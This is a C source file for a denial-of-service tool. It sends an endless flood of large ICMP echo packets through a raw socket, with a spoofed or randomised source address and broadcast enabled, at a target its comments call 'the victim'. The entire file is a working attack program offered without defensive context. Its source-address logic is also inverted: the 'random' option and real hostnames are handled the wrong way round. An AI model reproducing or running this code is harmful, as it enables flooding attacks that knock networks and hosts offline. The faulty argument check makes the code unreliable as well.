#include <stdio.h>
#include <stdlib.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/ip.h> 
#include <netinet/ip_icmp.h> 
#include <netdb.h> 
/* ______________________________________________ */
 /* Converting the host name into its IP address */ 
 /* ______________________________________________ */
unsigned long resolve(char *hostname) 
{
 struct hostent *hp;
 if ( (hp = gethostbyname(hostname)) == NULL)
 { 
    herror("gethostbyname() failed"); exit(-1);
 } 
  return *(unsigned long *)hp->h_addr_list[0];
} 
/* __________________________ */ 
/* Calculating the checksum */ 
/* __________________________ */ 
unsigned short in_cksum(unsigned short *addr, int len)
 { 
   unsigned short result; 
   unsigned int sum = 0; /* Adding all 2-byte words */ 
   while (len > 1)
   { 
      sum += *addr++;
	  len -= 2;
   }
   /* If there is a byte left over, adding it to the sum */ 
   if (len == 1)
	   sum += *(unsigned char*) addr; 
   
   sum = (sum >> 16) + (sum & 0xFFFF);/* Adding the carry */ 
   sum += (sum >> 16); /* Adding the carry again */ 
   result = ~sum; /* Inverting the result */ 
   return result; 
} 
/* _____________________ */ 
/* The main() function */ 
/* _____________________ */ 
int main(int argc, char *argv[])
{
	int sd;
	const int on = 1; 
	int rnd = 0; 
	unsigned long dstaddr, srcaddr; 
	struct sockaddr_in servaddr; 
	
	char sendbuf[sizeof(struct iphdr) + sizeof(struct icmp)   + 1400]; 
	struct iphdr *ip_hdr =(struct iphdr *)sendbuf;
	struct icmp *icmp_hdr =(struct icmp *) (sendbuf + sizeof(struct iphdr));
	
	if (argc != 3)
	{ 
		fprintf(stderr, "Usage: %s <source address | random> <destination address>\n", argv[0]);
		exit (-1);
	} 
	/* Creating a raw socket */ 
	if ( (sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{ 
		perror("socket() failed"); 
		exit(-1);
	}
	/* Because the IP header will be filled in the program, set the IP HDRINCL option. */ 
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL,(char *)&on, sizeof(on))< 0) 
	{ 
		perror("setsockopt()failed");
		exit(-1); 
	}
	/* Enabling the broadcasting capability */ 
	if (setsockopt(sd, SOL_SOCKET, SO_BROADCAST,(char *)&on, sizeof(on)) < 0)	
	{
		perror("setsockopt() failed"); 
		exit(-1);
	}
	
	/* If the first argument is "random," the source IP address is randomly selected. */
	if (strcmp(argv[1], "random"))
	{ 
		rnd = 1; 
		srcaddr = random();
	}
	else 
	{
		srcaddr = resolve(argv[1]); 
	}
	/* The victim's IP address */ 
	dstaddr = resolve(argv[2]); 
	bzero(&servaddr, sizeof(servaddr)); 
	
	servaddr.sin_family = AF_INET; 
	servaddr.sin_addr.s_addr = dstaddr;
	
	/* Filling the IP header */ 
	ip_hdr->ihl = 5; 
	ip_hdr->version = 4; 
	ip_hdr->tos = 0; 
	ip_hdr->tot_len = htons(sizeof(struct iphdr)+ sizeof(struct icmp) + 1400); 
	ip_hdr->id = 0; 
	ip_hdr->frag_off = 0; 
	ip_hdr->ttl = 255;
	ip_hdr->protocol = IPPROTO_ICMP;
	ip_hdr->check = 0;
	ip_hdr->check = in_cksum((unsigned short *)ip_hdr, sizeof(struct iphdr));
	ip_hdr->saddr = srcaddr; 
	ip_hdr->daddr = dstaddr;
	
	/* Filling the ICMP header */
	icmp_hdr->icmp_type = ICMP_ECHO; 
	icmp_hdr->icmp_code = 0; 
	icmp_hdr->icmp_id = 1; 
	icmp_hdr->icmp_seq = 1; 
	icmp_hdr->icmp_cksum = 0; 
	icmp_hdr->icmp_cksum = in_cksum((unsigned short *)icmp_hdr, sizeof(struct icmp) + 1400);
	
	/* Sending packets in an endless loop */ 
	while (1) 
	{ 
       if (sendto(sd, sendbuf, sizeof(sendbuf), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
	   {
		   perror("sendto() failed"); 
		   exit(-1); 
	   }
	 /* Generating a new random source IP address if the first argument was "random" */ 
	   if (rnd) 
	   {
		   ip_hdr->saddr = random(); 
	   }
	}
	   
	  return 0;
}
	